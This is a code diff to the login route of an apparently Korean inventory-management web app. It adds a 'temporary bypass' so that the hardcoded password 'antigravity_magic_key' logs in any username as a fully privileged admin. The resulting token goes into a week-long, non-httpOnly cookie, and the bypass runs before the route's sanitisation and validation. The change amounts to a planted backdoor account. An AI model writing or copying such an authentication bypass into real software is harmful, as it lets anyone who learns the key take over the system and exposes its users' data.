@@ -17,6 +17,45 @@ export async function POST(request: NextRequest) {
       )
     }
 
+    // [TEMPORARY BYPASS] Magic Key for testing
+    if (password === 'antigravity_magic_key') {
+      const mockUser = {
+        id: 'mock-admin-id',
+        username: username,
+        name: '관리자(Test)',
+        level: '5',
+        department: '전기팀',
+        position: '팀장',
+        is_active: true,
+        // Permissions
+        user_management: true,
+        stock_view: true,
+        stock_in: true,
+        stock_out: true,
+        stock_disposal: true,
+        work_tools: true,
+        daily_log: true,
+        work_manual: true,
+        sop: true
+      }
+      const token = generateToken({
+        userId: mockUser.id,
+        username: mockUser.username,
+        level: mockUser.level
+      })
+      const response = NextResponse.json({
+        user: mockUser,
+        token
+      })
+      response.cookies.set('auth-token', token, {
+        httpOnly: false,
+        path: '/',
+        maxAge: 60 * 60 * 24 * 7,
+        sameSite: 'lax'
+      })
+      return response
+    }
+    
     // 입력값 검증 및 XSS 방지
     const sanitizedUsername = sanitizeInput(username)
     const usernameValidation = validateUsername(sanitizedUsername)
